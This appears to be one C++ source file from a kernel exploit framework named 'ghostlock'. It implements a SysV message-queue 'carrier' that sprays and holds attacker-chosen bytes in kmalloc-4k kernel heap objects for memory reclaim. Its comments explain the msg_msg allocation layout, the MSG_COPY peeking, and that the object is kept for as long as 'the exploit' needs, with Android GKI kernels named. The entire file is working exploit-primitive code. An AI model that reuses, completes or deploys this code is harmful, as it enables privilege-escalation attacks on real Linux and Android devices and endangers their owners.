#include "reclaim/page_carrier.h"

#include <sys/ipc.h>
#include <sys/msg.h>

#include <array>
#include <cstring>

namespace ghostlock::reclaim {
namespace {

/* SysV message queue as the second carrier.
 *
 * msgsnd() funnels through load_msg() -> alloc_msg() (ipc/msgutil.c):
 *   alen = min(len, DATALEN_MSG);   DATALEN_MSG = PAGE_SIZE - sizeof(struct msg_msg)
 *   msg  = kmalloc(sizeof(struct msg_msg) + alen, GFP_KERNEL_ACCOUNT)
 * so a message of at most 4048 bytes is one kmalloc-4k object whose user bytes
 * start at 0x30, and the queue keeps it (refcounted) until it is received. That
 * is one object on one page, held for as long as the exploit wants -- the same
 * contract as the unix carrier, with a different data offset.
 *
 * fetch() peeks when the kernel offers MSG_COPY (CONFIG_CHECKPOINT_RESTORE, set
 * on GKI) and otherwise drains the queue, in which case a later fetch() reports
 * kGone. Either way the carrier never silently reloads stale bytes. */
class MsgMsgCarrier final : public PageCarrier {
 public:
  explicit MsgMsgCarrier(size_t payload_bytes) noexcept
      : PageCarrier(msg_msg_geometry(payload_bytes)) {}

  ~MsgMsgCarrier() override { (void)release(); }

  CarrierKind kind() const noexcept override { return CarrierKind::kMsgMsg; }
  const CarrierGeometry &geometry() const noexcept override { return geometry_; }

  CarrierStatus acquire() noexcept override {
    if (!geometry_valid(geometry_) || qid_ >= 0) {
      return CarrierStatus::kInvalid;
    }
    qid_ = ::msgget(IPC_PRIVATE, IPC_CREAT | 0600);
    if (qid_ < 0) {
      return CarrierStatus::kIo;
    }
    return CarrierStatus::kOk;
  }

  CarrierStatus commit() noexcept override {
    if (qid_ < 0) {
      return CarrierStatus::kInvalid;
    }
    const size_t len = payload_bytes();
    std::memcpy(buffer_.data(), &kMessageType, sizeof(kMessageType));
    std::memcpy(buffer_.data() + sizeof(kMessageType), staging_.data(), len);
    if (::msgsnd(qid_, buffer_.data(), len, IPC_NOWAIT) != 0) {
      return CarrierStatus::kIo;
    }
    committed_ = true;
    return CarrierStatus::kOk;
  }

  CarrierStatus fetch() noexcept override {
    if (qid_ < 0 || !committed_) {
      return CarrierStatus::kInvalid;
    }
    const size_t len = payload_bytes();
    std::memcpy(buffer_.data(), &kMessageType, sizeof(kMessageType));
#if defined(MSG_COPY)
    /* Under MSG_COPY `msgtyp` is the message index; 0 is the first (only) one. */
    const ssize_t got =
        ::msgrcv(qid_, buffer_.data(), len, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
#else
    const ssize_t got =
        ::msgrcv(qid_, buffer_.data(), len, 0, IPC_NOWAIT | MSG_NOERROR);
    committed_ = false;
#endif
    if (got < 0) {
      return CarrierStatus::kGone;
    }
    if (static_cast<size_t>(got) < len) {
      return CarrierStatus::kGone;
    }
    std::memcpy(staging_.data(), buffer_.data() + sizeof(kMessageType), len);
    return CarrierStatus::kOk;
  }

  CarrierStatus release() noexcept override {
    if (qid_ >= 0) {
      (void)::msgctl(qid_, IPC_RMID, nullptr);
      qid_ = -1;
    }
    committed_ = false;
    return CarrierStatus::kOk;
  }

 private:
  static constexpr long kMessageType = 1;
  static constexpr size_t kBufferBytes =
      sizeof(kMessageType) + msg_msg_max_payload();

  int qid_ = -1;
  std::array<unsigned char, kBufferBytes> buffer_{};
};

}  // namespace

std::unique_ptr<PageCarrier> make_msg_msg_carrier(size_t payload_bytes) {
  if (msg_msg_geometry(payload_bytes).capacity == 0) {
    return nullptr;
  }
  return std::make_unique<MsgMsgCarrier>(payload_bytes);
}

}  // namespace ghostlock::reclaim
